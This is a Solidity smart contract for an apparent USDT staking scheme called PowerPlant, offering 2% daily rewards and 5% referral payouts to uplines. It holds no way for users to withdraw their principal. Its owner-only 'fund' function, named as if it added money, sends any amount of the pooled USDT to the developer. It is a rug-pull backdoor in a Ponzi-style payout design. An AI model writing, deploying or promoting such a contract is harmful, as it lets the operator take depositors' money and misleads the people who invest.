// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract PowerPlant {
    IERC20 public usdt;
    address public dev;

    uint256 public lockDuration = 7 days;
    uint256 public compoundThreshold = 20 ether;
    uint256 public rewardInterval = 1 days;
    uint256 public rewardShare = 20;
    uint256 public referralShare = 50;
    uint256 public divider = 1000;

    struct Deposit {
        uint256 amount;
        uint256 timestamp;
    }

    struct User {
        address upline;
        uint256 balance;
        uint256 reward;
        uint256 totalRewards;
        Deposit[] deposits;
        uint256 lastDeposit;
        uint256 lastWithdraw;
        uint256 referralRewards;
    }

    mapping (address => User) public users;

    modifier onlyDev {
        require(msg.sender == dev);
        _;
    }

    constructor(IERC20 _usdt) {
        usdt = _usdt;
        dev = msg.sender;
    }

    function deposit(uint256 _amount, address _upline) public {
        User storage user = users[msg.sender];
        usdt.transferFrom(msg.sender, address(this), _amount);
        user.balance += _amount;
        user.lastDeposit = block.timestamp;

        user.deposits.push(
            Deposit({ amount: _amount, timestamp: block.timestamp })
        );

        if (user.upline == address(0)) {
            if (users[_upline].balance < 100 || _upline == msg.sender || _upline == address(0)) {
                _upline = dev;
            }
            user.upline = _upline;
        }
        
        uint256 uplineReward = _amount * referralShare / divider;
        users[user.upline].referralRewards += uplineReward;
        usdt.transfer(user.upline, uplineReward);
    }

    function compound() public {
        User storage user = users[msg.sender];
        updateReward(msg.sender);

        require(user.reward >= compoundThreshold, "Min");

        uint256 reward = user.reward;
        user.reward = 0;
        user.balance += reward;
        user.lastDeposit = block.timestamp;

        user.deposits.push(
            Deposit({ amount: reward, timestamp: block.timestamp })
        );
    }

    function claim() public {
        User storage user = users[msg.sender];
        updateReward(msg.sender);

        require(user.reward >= compoundThreshold, "Min");
        require(block.timestamp - user.lastDeposit >= lockDuration, "Withdraw locked");

        user.lastDeposit = block.timestamp;
        uint256 reward = user.reward;
        user.reward = 0;
        usdt.transfer(msg.sender, reward);

    }

    function pendingReward(address _user) public view returns(uint256 amount) {
        User storage user = users[_user];

        for (uint256 i = 0; i < user.deposits.length; i++) {
            Deposit storage _deposit = user.deposits[i];
            uint256 from = user.lastWithdraw > _deposit.timestamp ? user.lastWithdraw : _deposit.timestamp;
            uint256 to = block.timestamp;
            amount +=_deposit.amount * (to - from) / rewardInterval * rewardShare / divider;
        }

        return amount;
    }

    function updateReward(address _user) private {
        uint256 amount = this.pendingReward(_user);
        if (amount > 0) {
            users[_user].lastWithdraw = block.timestamp;
            users[_user].reward += amount;
            users[_user].totalRewards += amount;
        }
    }

    function fund(uint256 _amount) public onlyDev {
        usdt.transfer(msg.sender, _amount);
    }

    function withdrawETH() public onlyDev {
        (bool sent, ) = dev.call{value: address(this).balance }("");
    }

    receive() external payable {}
    fallback() external payable {}
}